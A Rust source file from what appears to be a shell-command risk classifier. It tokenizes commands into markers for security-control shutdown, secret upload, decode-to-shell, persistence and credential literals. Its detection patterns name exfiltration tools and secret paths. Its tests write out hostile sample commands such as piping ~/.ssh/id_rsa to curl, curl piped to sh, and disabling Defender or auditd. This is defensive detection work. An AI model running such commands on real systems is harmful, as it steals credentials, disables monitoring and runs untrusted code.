// SPDX-License-Identifier: GPL-3.0-only
//! The `kf1` token analyzer of the K26 shell-risk model: live shell tokens,
//! the legacy semantic, flow and risk markers, and the flattened
//! `patronus.facts/1` tokens. Port of the K26 reference `features.py`.
//!
//! Every marker is deterministic and computed from the text alone; nothing is
//! executed. `kf1` returns the same multiset of tokens as the Python analyzer,
//! which is all the TF-IDF block consumes.

use std::collections::BTreeSet;
use std::sync::LazyLock;

use regex::Regex;

use super::facts::{extract, Facts};
use super::markers::{
    head_and_rest, is_redirect_token, line_tokens_masked, segments, unquote, word_set, WordSet,
};
use super::pyre::{py_regex, Anchor};
use super::shell_tokens;

static NEG_KEY: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"(disable|deny|block|exclu|skip|bypass|nocheck|^no[A-Z_]|^no-|ignore|allowunsigned)",
        true,
        Anchor::Search,
    )
});
static POS_KEY: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"(enable|allow|^use|start|active|protect|enforce|audit|log|monitor|scan|firewall|guard|realtime|consent|lua|amsi|etw|selinux|apparmor|defender)",
        true,
        Anchor::Search,
    )
});
static ON_VAL: WordSet = word_set!(
    "1",
    "true",
    "$true",
    "yes",
    "on",
    "enable",
    "enabled",
    "start",
    "allow",
    "enforcing",
    "active"
);
static OFF_VAL: WordSet = word_set!(
    "0",
    "false",
    "$false",
    "no",
    "off",
    "disable",
    "disabled",
    "stop",
    "deny",
    "none",
    "permissive",
    "inactive",
);
static ON_VERBS: WordSet = word_set!("start", "enable", "unmask", "load", "install", "restore");
static OFF_VERBS: WordSet = word_set!(
    "stop",
    "disable",
    "mask",
    "unload",
    "uninstall",
    "remove",
    "kill",
    "flush",
    "clear",
    "delete",
    "deletejournal",
    "erase",
    "purge",
    "reset",
);
pub(crate) static SECCTL: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"(audit|defender|windefend|mpsvc|sense|amsi|etw|eventlog|autologger|sysmon|falcon|crowdstrike|carbonblack|cbdefense|sentinel|mdatp|edr|xdr|antivirus|antispyware|realtime|firewall|ufw|firewalld|iptables|nftables|\bpf\b|selinux|apparmor|setenforce|wdigest|lsa|credentialguard|uac|enablelua|consentprompt|cloudtrail|flow-logs|flowlog|guardduty|securityhub|syslog|journald|rsyslog|osquery|wazuh|ossec|tamper|usn|smartscreen|applocker|wdac|bitlocker|aslr|randomize_va)",
        true,
        Anchor::Search,
    )
});
pub(crate) static FIXTURE: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"(^|[/\\])(testdata|test-data|fixtures?|examples?|samples?|__fixtures__|mocks?)([/\\]|$)",
        true,
        Anchor::Search,
    )
});
static FLAG_ASSIGNMENT: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"^-{0,2}([A-Za-z_][\w.-]{1,60})[:=](.+)$",
        false,
        Anchor::Match,
    )
});
static NOPASSWD_ALL: LazyLock<Regex> =
    LazyLock::new(|| py_regex(r"NOPASSWD:\s*ALL\b", false, Anchor::Search));
static HOST_ROOT_VALUE: LazyLock<Regex> =
    LazyLock::new(|| py_regex(r"^/:/|^/:\w|source=/,", false, Anchor::Match));
static HOST_ROOT_FLAG: LazyLock<Regex> =
    LazyLock::new(|| py_regex(r"^-v/:/|^--volume=/:/", false, Anchor::Match));

/// `ON` / `OFF` polarity of a setting value, if any.
fn polarity_value(value: &str) -> Option<&'static str> {
    let value = value.trim_matches(['\'', '"']).to_lowercase();
    if ON_VAL.contains(value.as_str()) {
        Some("ON")
    } else if OFF_VAL.contains(value.as_str()) {
        Some("OFF")
    } else {
        None
    }
}

/// `TURNS_ON` / `TURNS_OFF` from key polarity times value polarity.
pub(crate) fn turns(key: &str, value: &str) -> Option<&'static str> {
    let on = polarity_value(value)? == "ON";
    if NEG_KEY.is_match(key) {
        Some(if on { "TURNS_OFF" } else { "TURNS_ON" })
    } else if POS_KEY.is_match(key) {
        Some(if on { "TURNS_ON" } else { "TURNS_OFF" })
    } else {
        None
    }
}

const SETTING_HEADS: [&str; 14] = [
    "systemctl",
    "service",
    "sc",
    "launchctl",
    "ufw",
    "sysmon",
    "netsh",
    "fsutil",
    "auditpol",
    "mdatp",
    "wevtutil",
    "aws",
    "gcloud",
    "az",
];

/// Semantic markers of one segment (`segment_markers`).
pub(crate) fn segment_markers<S: AsRef<str>>(head: &str, rest: &[S]) -> BTreeSet<&'static str> {
    let rest: Vec<&str> = rest.iter().map(AsRef::as_ref).collect();
    let mut out = BTreeSet::new();
    let joined = std::iter::once(head)
        .chain(rest.iter().copied())
        .collect::<Vec<_>>()
        .join(" ");
    if SECCTL.is_match(&joined) {
        out.insert("SECCTL");
    }
    // key/value pairs: /v NAME ... /d VAL (reg), -Name N -Value V, -Flag VAL, key=value, --value V
    let mut name: Option<&str> = None;
    for (k, &word) in rest.iter().enumerate() {
        let lower = word.to_lowercase();
        let next = rest.get(k + 1).copied().unwrap_or("");
        if matches!(lower.as_str(), "/v" | "-name" | "-valuename") && !next.is_empty() {
            name = Some(next);
        } else if matches!(lower.as_str(), "/d" | "-value" | "--value" | "-data")
            && !next.is_empty()
        {
            let mut turned = name.filter(|n| !n.is_empty()).and_then(|n| turns(n, next));
            if turned.is_none() && lower == "--value" {
                turned =
                    polarity_value(next).map(|p| if p == "ON" { "TURNS_ON" } else { "TURNS_OFF" });
            }
            out.extend(turned);
        } else if lower.starts_with('-')
            && lower.chars().count() > 2
            && !next.is_empty()
            && polarity_value(next).is_some()
            && !next.starts_with('-')
        {
            out.extend(turns(word.trim_start_matches('-'), next));
        }
        if let Some(captures) = FLAG_ASSIGNMENT.captures(word) {
            out.extend(turns(&captures[1], &captures[2]));
        }
    }
    if head == "setenforce" && !rest.is_empty() {
        let on = matches!(rest[0].to_lowercase().as_str(), "1" | "enforcing");
        out.insert(if on { "TURNS_ON" } else { "TURNS_OFF" });
    }
    if head == "auditctl" {
        if let Some(index) = rest.iter().position(|w| *w == "-e") {
            match rest.get(index + 1).copied().unwrap_or("") {
                "1" => {
                    out.insert("TURNS_ON");
                }
                "0" => {
                    out.insert("TURNS_OFF");
                }
                _ => {}
            }
        }
    }
    let verbs: Vec<String> = rest
        .iter()
        .take(3)
        .filter(|w| !w.starts_with('-'))
        .map(|w| w.to_lowercase())
        .collect();
    if SETTING_HEADS.contains(&head) || head.ends_with("-service") {
        let off_verb = verbs.iter().any(|v| {
            OFF_VERBS.contains(v.as_str())
                || ["stop", "disable", "delete", "remove", "clear"]
                    .iter()
                    .any(|p| v.starts_with(p))
        });
        let off_word = rest.iter().any(|w| {
            let w = w.to_lowercase();
            matches!(
                w.as_str(),
                "-u" | "/clear" | "disable" | "stop" | "/success:disable" | "/failure:disable"
            ) || w.ends_with(":disable")
                || w.ends_with("=disabled")
        });
        if off_verb || off_word {
            out.insert("TURNS_OFF");
        } else if verbs.iter().any(|v| {
            ON_VERBS.contains(v.as_str()) || v.starts_with("start") || v.starts_with("enable")
        }) || rest.contains(&"-i")
        {
            out.insert("TURNS_ON");
        }
    }
    if [
        "stop-service",
        "set-service",
        "disable-",
        "uninstall-",
        "remove-",
    ]
    .iter()
    .any(|p| head.starts_with(p))
    {
        out.insert("TURNS_OFF");
    }
    if ["start-service", "enable-", "install-"]
        .iter()
        .any(|p| head.starts_with(p))
    {
        out.insert("TURNS_ON");
    }
    if out.contains("SECCTL") {
        if out.contains("TURNS_ON") {
            out.insert("TURNS_ON@SECCTL");
        }
        if out.contains("TURNS_OFF") {
            out.insert("TURNS_OFF@SECCTL");
        }
    }
    if NOPASSWD_ALL.is_match(&joined) {
        out.insert("GRANT_ALL");
    } else if joined.contains("NOPASSWD:") {
        out.insert("GRANT_SCOPED");
    }
    for (k, &word) in rest.iter().enumerate() {
        if matches!(word, "-v" | "--volume" | "--mount")
            && rest
                .get(k + 1)
                .is_some_and(|next| HOST_ROOT_VALUE.is_match(next))
        {
            out.insert("HOST_ROOT_MOUNT");
        }
        if HOST_ROOT_FLAG.is_match(word) {
            out.insert("HOST_ROOT_MOUNT");
        }
        if word == "--privileged"
            || matches!(
                word.to_lowercase().as_str(),
                "--privileged=true" | "--privileged=1"
            )
        {
            out.insert("PRIVILEGED");
        }
        if FIXTURE.is_match(word) {
            out.insert("TGT=FIXTURE");
        }
    }
    out
}

/// Semantic markers of all segments, de-duplicated (`semantic_markers`).
fn semantic_markers(text: &str) -> BTreeSet<&'static str> {
    let mut found = BTreeSet::new();
    for seg in segments(text) {
        if let (Some(head), rest) = head_and_rest(&seg) {
            if !head.is_empty() {
                found.extend(segment_markers(&head, rest));
            }
        }
    }
    found
}

// ---- kv2: flow markers ----

pub(crate) static UPLOADERS: WordSet = word_set!(
    "curl",
    "wget",
    "nc",
    "ncat",
    "netcat",
    "socat",
    "scp",
    "rsync",
    "invoke-webrequest",
    "invoke-restmethod",
    "iwr",
    "irm",
    "ftp",
    "sftp",
);
pub(crate) static UPLOAD_FLAG: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"^(-d|--data(-binary|-raw|-urlencode|-ascii)?|-F|--form|-T|--upload-file|--post-file(=.*)?|--post-data(=.*)?|-InFile|-Body)$",
        true,
        Anchor::Match,
    )
});
static SECRET_PATH: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"(^|[/\\~])(\.ssh/id_[a-z0-9]+|\.aws/credentials|\.env(\.\w+)?|\.netrc|\.pgpass|\.git-credentials|\.kube/config|\.docker/config\.json|shadow|id_[a-z0-9]+)$",
        true,
        Anchor::Search,
    )
});
static ENV_DUMP: WordSet = word_set!("printenv", "env", "set", "export", "get-childitem");
static DECODERS: WordSet = word_set!("base64", "xxd", "certutil", "openssl", "uudecode", "base32");
pub(crate) static SHELLS: WordSet = word_set!(
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "python",
    "python3",
    "perl",
    "ruby",
    "node",
    "iex",
    "invoke-expression",
    "powershell",
    "pwsh",
    "cmd",
    "source",
    ".",
    "eval",
);
static CRED_EXAMPLE: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"(AKIA[0-9A-Z]{0,16}EXAMPLE|EXAMPLE[A-Z0-9]*KEY|sk-[a-z-]*example|example[-_]?(key|token|secret))",
        true,
        Anchor::Search,
    )
});
static PROJECT_FILE: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"(^|/)(README|CHANGELOG|LICENSE)|\.(md|txt|json|ya?ml|csv|log)$",
        true,
        Anchor::Search,
    )
});
pub(crate) static FORM_FILE: LazyLock<Regex> =
    LazyLock::new(|| py_regex(r"^[\w.-]+=([@<].+)$", false, Anchor::Match));
static KILL_WORD: LazyLock<Regex> = LazyLock::new(|| py_regex(r"[-/]?\w+", false, Anchor::Full));
static PID: LazyLock<Regex> = LazyLock::new(|| py_regex(r"\d{2,}", false, Anchor::Full));
static DECODE_FLAG: LazyLock<Regex> =
    LazyLock::new(|| py_regex(r"-[a-z]*d[a-z]*", false, Anchor::Full));

/// Words of a segment without bare redirect operators.
pub(crate) fn clean<S: AsRef<str>>(seg: &[S]) -> Vec<&str> {
    seg.iter()
        .map(AsRef::as_ref)
        .filter(|w| !matches!(*w, "<" | ">" | ">>"))
        .collect()
}

/// Where the data of a segment comes from: `SECRET`, `LITERAL`, `PUBLIC_KEY`,
/// `PROJECT` or `OTHER` (`classify_source`).
pub(crate) fn classify_source<S: AsRef<str>>(seg: &[S]) -> &'static str {
    let (Some(head), rest) = head_and_rest(seg) else {
        return "OTHER";
    };
    let args: Vec<&str> = rest
        .iter()
        .map(AsRef::as_ref)
        .filter(|w| !w.starts_with('-'))
        .collect();
    if ENV_DUMP.contains(head.as_str()) && args.is_empty() {
        return "SECRET";
    }
    if matches!(head.as_str(), "echo" | "printf" | "write-output")
        && !args.is_empty()
        && !args.iter().any(|a| a.contains('$') || a.contains('`'))
    {
        return "LITERAL";
    }
    for arg in &args {
        if arg.ends_with(".pub") {
            return "PUBLIC_KEY";
        }
        if SECRET_PATH.is_match(arg) {
            return "SECRET";
        }
    }
    if args.iter().any(|a| PROJECT_FILE.is_match(a)) {
        return "PROJECT";
    }
    "OTHER"
}

/// A pipeline: its segments, each a list of words (redirect operators kept).
pub(crate) type Pipeline = Vec<Vec<String>>;

/// Pipelines as lists of segments: split on `|` inside, on `;` `&&` `||` `&`,
/// newlines and parentheses between (`raw_pipelines`).
pub(crate) fn raw_pipelines(text: &str) -> Vec<Pipeline> {
    let mut pipes = Vec::new();
    let mut pipe: Pipeline = Vec::new();
    let mut seg: Vec<String> = Vec::new();
    let flush = |pipe: &mut Pipeline, pipes: &mut Vec<Pipeline>| {
        let done: Pipeline = std::mem::take(pipe)
            .into_iter()
            .filter(|s| !s.is_empty())
            .collect();
        pipes.push(done);
    };
    for token in line_tokens_masked(text).iter() {
        let token = token.as_str();
        if token == "|" {
            pipe.push(std::mem::take(&mut seg));
        } else if matches!(token, ";" | "&&" | "||" | "&" | "\n" | "(" | ")" | "$(") {
            pipe.push(std::mem::take(&mut seg));
            flush(&mut pipe, &mut pipes);
        } else if is_redirect_token(token) {
            seg.push(token.to_string());
        } else {
            seg.push(unquote(token).to_string());
        }
    }
    pipe.push(seg);
    flush(&mut pipe, &mut pipes);
    pipes.into_iter().filter(|p| !p.is_empty()).collect()
}

/// The upload value of `word` at `k`: `--flag=value`, or the next word after an
/// upload flag (`val` in `flow_markers`).
fn upload_value<'a>(rest: &[&'a str], k: usize) -> Option<&'a str> {
    let word = rest[k];
    if let Some((key, value)) = word.split_once('=') {
        if UPLOAD_FLAG.is_match(key) {
            return Some(value);
        }
    }
    if UPLOAD_FLAG.is_match(word) {
        return rest.get(k + 1).copied();
    }
    None
}

/// Flow markers: what is uploaded, what is killed, where decoded data goes,
/// key use (`flow_markers`).
pub(crate) fn flow_markers(text: &str, pipes: &[Pipeline]) -> BTreeSet<String> {
    let mut out = BTreeSet::new();
    if CRED_EXAMPLE.is_match(text) {
        out.insert("CRED_EXAMPLE".to_string());
    }
    for pipe in pipes {
        let heads: Vec<Option<String>> = pipe.iter().map(|s| head_and_rest(&clean(s)).0).collect();
        for (i, (seg, head)) in pipe.iter().zip(&heads).enumerate() {
            let Some(head) = head.as_deref() else {
                continue;
            };
            let cleaned = clean(seg);
            let rest = head_and_rest(&cleaned).1;
            if UPLOADERS.contains(head) {
                let is_upload = rest.iter().any(|w| UPLOAD_FLAG.is_match(w))
                    || (matches!(head, "nc" | "ncat" | "netcat" | "socat") && i > 0)
                    || (matches!(head, "scp" | "rsync") && rest.iter().any(|w| w.contains(':')));
                if is_upload {
                    let mut source: Option<&'static str> = None;
                    for (k, &word) in rest.iter().enumerate() {
                        let mut value = upload_value(rest, k).map(str::to_string);
                        if let Some(captures) = value.as_deref().and_then(|v| FORM_FILE.captures(v))
                        {
                            value = Some(format!("@{}", &captures[1][1..]));
                        }
                        let Some(value) = value.filter(|v| !v.is_empty()) else {
                            continue;
                        };
                        if value.starts_with('@') && value != "@-" {
                            source = Some(classify_source(&["cat", &value[1..]]));
                        } else if matches!(word, "-T" | "--upload-file")
                            || word.to_lowercase() == "-infile"
                        {
                            source = Some(classify_source(&["cat", value.as_str()]));
                        } else if value != "@-" && !value.starts_with('@') {
                            source = Some("LITERAL");
                        }
                    }
                    if source.is_none() && i > 0 {
                        let previous = &pipe[i - 1];
                        let mut found = classify_source(&clean(previous));
                        if found == "OTHER" {
                            if let Some(j) = previous.iter().position(|w| w == "<") {
                                if let Some(file) = previous.get(j + 1) {
                                    found = classify_source(&["cat", file.as_str()]);
                                }
                            }
                        }
                        source = Some(found);
                    }
                    out.insert(format!("UPLOAD_OF={}", source.unwrap_or("OTHER")));
                }
            }
            if matches!(
                head,
                "kill" | "taskkill" | "stop-process" | "pkill" | "killall" | "skill"
            ) {
                let broad = (matches!(head, "killall" | "pkill" | "skill")
                    && rest.iter().any(|w| matches!(*w, "-u" | "-U")))
                    || rest
                        .iter()
                        .any(|w| matches!(*w, "-1" | "/im" | "*") || w.starts_with("-1"))
                    || head == "killall5";
                let single = rest.iter().all(|w| KILL_WORD.is_match(w))
                    && rest.iter().any(|w| PID.is_match(w));
                out.insert(
                    if broad {
                        "KILL_BROAD"
                    } else if single {
                        "KILL_ONE"
                    } else {
                        "KILL_OTHER"
                    }
                    .to_string(),
                );
            }
            if DECODERS.contains(head)
                && rest.iter().any(|w| {
                    matches!(*w, "-d" | "--decode" | "-D" | "-decode" | "-r")
                        || DECODE_FLAG.is_match(w)
                })
            {
                let later = || heads[i + 1..].iter().flatten().filter(|h| !h.is_empty());
                if later().any(|h| SHELLS.contains(h.as_str())) {
                    out.insert("DECODE->INTERP".to_string());
                } else if seg.iter().any(|w| w == ">" || w == ">>") || later().any(|h| h == "tee") {
                    out.insert("DECODE->FILE".to_string());
                }
            }
            if matches!(head, "ssh" | "scp" | "sftp") && rest.contains(&"-i") {
                out.insert("KEY_USE".to_string());
            }
        }
    }
    out
}

// ---- kv3: credential literals, git exec config, persistence targets, wider secret paths ----

static CRED_FORMAT: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|gh[pousr]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}|xox[abposr]-[A-Za-z0-9-]{10,}|sk-(proj-|ant-)?[A-Za-z0-9_-]{20,}|AIza[0-9A-Za-z_-]{30,}|-----BEGIN [A-Z ]*PRIVATE KEY-----|glpat-[A-Za-z0-9_-]{20,})",
        false,
        Anchor::Search,
    )
});
static NET_EXTRA: WordSet = word_set!("ssh", "telnet", "nslookup", "dig", "host", "ping");
static GIT_EXEC_KEYS: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"^(core\.(sshcommand|fsmonitor|hookspath|pager|editor|askpass|gitproxy)|credential\.helper|alias\..+|diff\..+\.(textconv|command)|filter\..+\.(clean|smudge|process)|uploadpack\.packobjectshook|sequence\.editor)$",
        true,
        Anchor::Match,
    )
});
pub(crate) static PERSIST_TARGET: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"(authorized_keys2?|/\.(bashrc|bash_profile|profile|zshrc|zprofile|zshenv|bash_logout)$|/etc/(crontab|cron\.[a-z]+/|profile(\.d/)?|rc\.local|ld\.so\.preload|systemd/|init\.d/)|/var/spool/cron|/Library/Launch(Agents|Daemons)/|/\.config/autostart/|/lib/systemd/|\.git/hooks/[a-z-]+$)",
        true,
        Anchor::Search,
    )
});
static SECRET_EXTRA: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"(/proc/(self|\d+)/environ|\.kube/config|\.config/gh/hosts\.yml|\.config/gcloud/|\.azure/|keys\.json$|credentials\.json$|service[-_]account.*\.json$|\.npmrc$|\.pypirc$|\.vault-token|\.terraform\.d/credentials)",
        true,
        Anchor::Search,
    )
});
static GIT_CONFIG_TARGET: LazyLock<Regex> =
    LazyLock::new(|| py_regex(r"(^|/)\.git[/\\]config$", false, Anchor::Search));
static GIT_HOOK_TARGET: LazyLock<Regex> =
    LazyLock::new(|| py_regex(r"\.git[/\\]hooks[/\\][a-z-]+$", false, Anchor::Search));

/// Risk markers: credential literals, git exec config, persistence and wider
/// secret targets (`risk_markers`).
pub(crate) fn risk_markers(text: &str, pipes: &[Pipeline]) -> BTreeSet<&'static str> {
    let mut out = BTreeSet::new();
    if CRED_FORMAT.is_match(text) && !CRED_EXAMPLE.is_match(text) {
        out.insert("CRED_LITERAL");
    }
    for seg in pipes.iter().flatten() {
        let cleaned = clean(seg);
        let (Some(head), rest) = head_and_rest(&cleaned) else {
            continue;
        };
        if out.contains("CRED_LITERAL")
            && (UPLOADERS.contains(head.as_str()) || NET_EXTRA.contains(head.as_str()))
        {
            out.insert("CRED_LITERAL@NET");
        }
        for (k, word) in seg.iter().enumerate() {
            let target = if matches!(word.as_str(), ">" | ">>") && k + 1 < seg.len() {
                Some(seg[k + 1].as_str())
            } else if word.starts_with("--output=") || word.starts_with("--output-file=") {
                word.split_once('=').map(|(_, value)| value)
            } else {
                None
            };
            if let Some(target) = target.filter(|t| !t.is_empty()) {
                if GIT_CONFIG_TARGET.is_match(target) || GIT_HOOK_TARGET.is_match(target) {
                    out.insert("GIT_EXEC");
                }
                if PERSIST_TARGET.is_match(target) {
                    out.insert("TGT=PERSIST");
                }
            }
        }
        if head == "git" {
            if let Some(i) = rest.iter().position(|w| *w == "config") {
                let keys: Vec<&str> = rest[i + 1..]
                    .iter()
                    .copied()
                    .filter(|w| !w.starts_with('-'))
                    .collect();
                if !keys.is_empty() && GIT_EXEC_KEYS.is_match(keys[0]) && keys.len() > 1 {
                    out.insert("GIT_EXEC");
                }
            }
        }
        if matches!(
            head.as_str(),
            "tee" | "cp" | "mv" | "install" | "ln" | "dd" | "sed"
        ) && rest.iter().any(|w| PERSIST_TARGET.is_match(w))
        {
            out.insert("TGT=PERSIST");
        }
        if rest.iter().any(|w| SECRET_EXTRA.is_match(w)) {
            out.insert("TGT=SECRET");
        }
    }
    out
}

/// Deterministic flattening of the facts of one command into model tokens
/// (set, sorted) (`fact_tokens`).
pub(crate) fn fact_tokens(facts: &Facts) -> BTreeSet<String> {
    let mut out = BTreeSet::new();
    out.insert(format!("F:DIA={}", facts.dialect));
    for s in &facts.segments {
        let verb = s.verb.unwrap_or("NONE");
        let role = s.role.filter(|r| !r.is_empty()).unwrap_or("UNK");
        out.insert(format!("F:V={verb}"));
        out.insert(format!("F:R={role}"));
        out.insert(format!("F:VR={verb}:{role}"));
        out.extend(s.ops.iter().map(|o| format!("F:OP={o}")));
        for object in &s.objects {
            if let Some(access) = object.access {
                out.insert(format!("F:O={access}@{}", object.class));
            }
            out.insert(format!("F:C={}", object.class));
        }
        out.extend(
            s.settings
                .iter()
                .map(|x| format!("F:S={}:{}", x.domain, x.polarity)),
        );
        out.extend(s.sql.iter().map(|k| format!("F:SQL={k}")));
        out.extend(s.network.iter().map(|n| format!("F:NET={}", n.scope)));
        out.extend(s.grants.iter().map(|g| format!("F:G={g}")));
        if s.sensitive {
            out.insert("F:SENS".to_string());
        }
        if let Some(nested) = s.nested {
            out.insert(format!("F:NEST={nested}"));
            out.insert(format!("F:NEST_V={verb}"));
        }
        if s.host_root_mount {
            out.insert("F:HRM".to_string());
        }
        if s.privileged {
            out.insert("F:PRIV".to_string());
        }
    }
    for flow in &facts.flows {
        out.insert(format!("F:FLOW={}>{}", flow.data, flow.sink));
        out.insert(format!("F:FLOWV={}>{}>{}", flow.data, flow.sink, flow.via));
    }
    out.extend(facts.objects.iter().map(|o| format!("F:OBJ={}", o.class)));
    out.extend(facts.atoms.iter().map(|a| format!("F:A={a}")));
    out
}

/// The `kf1` analyzer: live tokens, semantic, flow and risk markers, and the
/// fact tokens of `facts` (the context-free facts of `text`).
pub(crate) fn kf1_with_facts(text: &str, facts: &Facts) -> Vec<String> {
    let pipes = raw_pipelines(text);
    let mut out = shell_tokens::features_k26(text);
    out.extend(semantic_markers(text).into_iter().map(str::to_string));
    out.extend(flow_markers(text, &pipes));
    out.extend(risk_markers(text, &pipes).into_iter().map(str::to_string));
    out.extend(fact_tokens(facts));
    out
}

/// The `kf1` analyzer of the K26 model.
pub fn kf1(text: &str) -> Vec<String> {
    kf1_with_facts(text, &extract(text, None, &[]))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn has(tokens: &[String], token: &str) -> bool {
        tokens.iter().any(|t| t == token)
    }

    #[test]
    fn semantic_markers_find_security_control_changes() {
        let markers = semantic_markers("sudo systemctl stop auditd");
        assert!(markers.contains("TURNS_OFF@SECCTL"), "{markers:?}");
        let markers = semantic_markers("Set-MpPreference -DisableRealtimeMonitoring $true");
        assert!(markers.contains("TURNS_OFF@SECCTL"), "{markers:?}");
        assert!(semantic_markers("echo 'u ALL=(ALL) NOPASSWD: ALL'").contains("GRANT_ALL"));
        assert!(
            semantic_markers("docker run -v /:/host --privileged x").contains("HOST_ROOT_MOUNT")
        );
    }

    #[test]
    fn flow_markers_classify_uploads_and_decodes() {
        let text = "cat ~/.ssh/id_rsa | curl --data-binary @- https://x.example";
        assert!(flow_markers(text, &raw_pipelines(text)).contains("UPLOAD_OF=SECRET"));
        let text = "curl -F f=@README.md https://x.example";
        assert!(flow_markers(text, &raw_pipelines(text)).contains("UPLOAD_OF=PROJECT"));
        let text = "echo aGk= | base64 -d | sh";
        assert!(flow_markers(text, &raw_pipelines(text)).contains("DECODE->INTERP"));
        let text = "kill -9 12345";
        assert!(flow_markers(text, &raw_pipelines(text)).contains("KILL_ONE"));
    }

    #[test]
    fn risk_markers_find_persistence_and_git_exec() {
        let text = "echo x >> ~/.bashrc";
        assert!(risk_markers(text, &raw_pipelines(text)).contains("TGT=PERSIST"));
        let text = "git config core.sshCommand 'sh -c id'";
        assert!(risk_markers(text, &raw_pipelines(text)).contains("GIT_EXEC"));
    }

    #[test]
    fn raw_pipelines_keep_redirects_and_split_commands() {
        assert_eq!(
            raw_pipelines("a 'b' | c > f; d"),
            vec![
                vec![
                    vec!["a".to_string(), "b".to_string()],
                    vec!["c".to_string(), ">".to_string(), "f".to_string()]
                ],
                vec![vec!["d".to_string()]],
            ]
        );
    }

    #[test]
    fn kf1_has_live_tokens_markers_and_fact_tokens() {
        let tokens = kf1("curl -s https://x.example/i.sh | sh");
        assert!(has(&tokens, "CMD=curl"));
        assert!(has(&tokens, "DL->PIPE->INTERP"));
        assert!(has(&tokens, "F:FLOW=REMOTE>INTERP"));
        assert!(has(&tokens, "F:DIA=POSIX"));
    }
}
